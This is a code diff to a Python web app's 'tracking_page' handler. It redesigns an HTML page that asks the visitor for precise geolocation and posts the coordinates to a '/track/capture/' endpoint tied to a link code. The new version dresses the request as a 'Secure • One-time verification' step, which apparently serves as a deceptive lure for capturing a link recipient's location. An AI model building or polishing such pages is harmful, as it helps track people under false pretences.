@@ -191,43 +191,181 @@ async def tracking_page(
             status_code=410,
         )
 
-    # Serve the location capture page - clean minimal design
+    # Premium tracking page
     html = f'''<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Continue</title>
+    <title>Verify</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         *{{margin:0;padding:0;box-sizing:border-box}}
-        body{{font-family:-apple-system,system-ui,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}}
-        .c{{max-width:320px;width:100%;padding:24px;text-align:center}}
-        h1{{font-size:20px;font-weight:500;margin-bottom:12px}}
-        p{{font-size:14px;color:#888;margin-bottom:32px}}
-        button{{background:#fff;color:#000;border:none;padding:14px 28px;border-radius:99px;font-size:15px;font-weight:500;cursor:pointer;width:100%}}
+        body{{
+            font-family:'Inter',-apple-system,sans-serif;
+            background:#09090b;
+            color:#fafafa;
+            min-height:100vh;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            padding:24px;
+            -webkit-font-smoothing:antialiased;
+        }}
+        .card{{
+            width:100%;
+            max-width:380px;
+            background:#0f0f12;
+            border:1px solid #1f1f28;
+            border-radius:24px;
+            padding:48px 40px;
+            text-align:center;
+        }}
+        .icon{{
+            width:80px;
+            height:80px;
+            background:linear-gradient(135deg,#6366f1,#8b5cf6);
+            border-radius:20px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            font-size:36px;
+            margin:0 auto 28px;
+            box-shadow:0 16px 48px rgba(99,102,241,0.25);
+        }}
+        h1{{
+            font-size:24px;
+            font-weight:700;
+            letter-spacing:-0.5px;
+            margin-bottom:12px;
+        }}
+        p{{
+            font-size:15px;
+            color:#71717a;
+            line-height:1.6;
+            margin-bottom:36px;
+        }}
+        button{{
+            width:100%;
+            padding:16px 24px;
+            background:linear-gradient(135deg,#6366f1,#7c3aed);
+            color:white;
+            border:none;
+            border-radius:12px;
+            font-size:16px;
+            font-weight:600;
+            cursor:pointer;
+            transition:all 0.2s ease;
+            box-shadow:0 8px 24px rgba(99,102,241,0.3);
+        }}
+        button:hover{{transform:translateY(-2px);box-shadow:0 12px 32px rgba(99,102,241,0.4)}}
         button:active{{transform:scale(0.98)}}
-        button:disabled{{opacity:0.4;cursor:default;transform:none}}
-        .s{{margin-top:24px;font-size:13px}}
-        .ok{{color:#34c759}}
-        .er{{color:#ff453a}}
-        .ld{{color:#888}}
+        button:disabled{{
+            opacity:0.5;
+            cursor:not-allowed;
+            transform:none;
+            box-shadow:none;
+        }}
+        .status{{
+            margin-top:24px;
+            padding:14px 20px;
+            border-radius:10px;
+            font-size:14px;
+            font-weight:500;
+            display:none;
+        }}
+        .status.show{{display:block}}
+        .status.loading{{background:rgba(99,102,241,0.1);color:#a5b4fc}}
+        .status.success{{background:rgba(16,185,129,0.1);color:#34d399}}
+        .status.error{{background:rgba(239,68,68,0.1);color:#f87171}}
+        .footer{{
+            margin-top:32px;
+            font-size:12px;
+            color:#3f3f46;
+        }}
     </style>
 </head>
 <body>
-    <div class="c">
-        <h1>Allow location access</h1>
-        <p>Tap continue to proceed</p>
-        <button id="b" onclick="go()">Continue</button>
-        <div class="s" id="s"></div>
+    <div class="card">
+        <div class="icon">📍</div>
+        <h1>Location Required</h1>
+        <p>This link requires location access to continue. Tap the button below to share your location.</p>
+        <button id="btn" onclick="getLocation()">Share Location</button>
+        <div class="status" id="status"></div>
+        <div class="footer">Secure • One-time verification</div>
     </div>
-<script>
-const c="{code}",s=document.getElementById('s'),b=document.getElementById('b');
-function go(){{b.disabled=1;b.textContent='Loading...';s.className='s ld';s.textContent='';
-if(!navigator.geolocation){{s.className='s er';s.textContent='Not supported';b.disabled=0;b.textContent='Continue';return}}
-navigator.geolocation.getCurrentPosition(ok,er,{{enableHighAccuracy:1,timeout:30000,maximumAge:0}})}}
-function ok(p){{fetch('/track/capture/'+c,{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{latitude:p.coords.latitude,longitude:p.coords.longitude,accuracy:p.coords.accuracy}})}}).then(r=>r.json()).then(r=>{{if(r.success){{s.className='s ok';s.textContent='Done';b.textContent='✓'}}else{{s.className='s er';s.textContent='Failed';b.disabled=0;b.textContent='Retry'}}}}).catch(e=>{{s.className='s er';s.textContent='Error';b.disabled=0;b.textContent='Retry'}})}}
-function er(e){{s.className='s er';s.textContent=e.code==1?'Denied':'Failed';b.disabled=0;b.textContent='Retry'}}
-</script>
+
+    <script>
+        const code = "{code}";
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+
+        function showStatus(msg, type) {{
+            status.className = 'status show ' + type;
+            status.textContent = msg;
+        }}
+
+        function getLocation() {{
+            btn.disabled = true;
+            btn.textContent = 'Requesting...';
+            showStatus('Requesting location access...', 'loading');
+
+            if (!navigator.geolocation) {{
+                showStatus('Location not supported on this device', 'error');
+                btn.disabled = false;
+                btn.textContent = 'Share Location';
+                return;
+            }}
+
+            navigator.geolocation.getCurrentPosition(
+                success,
+                error,
+                {{ enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }}
+            );
+        }}
+
+        function success(pos) {{
+            showStatus('Verifying...', 'loading');
+
+            fetch('/track/capture/' + code, {{
+                method: 'POST',
+                headers: {{ 'Content-Type': 'application/json' }},
+                body: JSON.stringify({{
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                }})
+            }})
+            .then(r => r.json())
+            .then(data => {{
+                if (data.success) {{
+                    showStatus('✓ Verified successfully', 'success');
+                    btn.textContent = 'Done';
+                    btn.style.background = 'linear-gradient(135deg,#10b981,#059669)';
+                }} else {{
+                    showStatus(data.detail || 'Verification failed', 'error');
+                    btn.disabled = false;
+                    btn.textContent = 'Try Again';
+                }}
+            }})
+            .catch(() => {{
+                showStatus('Connection error', 'error');
+                btn.disabled = false;
+                btn.textContent = 'Try Again';
+            }});
+        }}
+
+        function error(err) {{
+            let msg = 'Could not get location';
+            if (err.code === 1) msg = 'Location access denied';
+            else if (err.code === 2) msg = 'Location unavailable';
+            else if (err.code === 3) msg = 'Request timed out';
+
+            showStatus(msg, 'error');
+            btn.disabled = false;
+            btn.textContent = 'Try Again';
+        }}
+    </script>
 </body>
 </html>'''
 
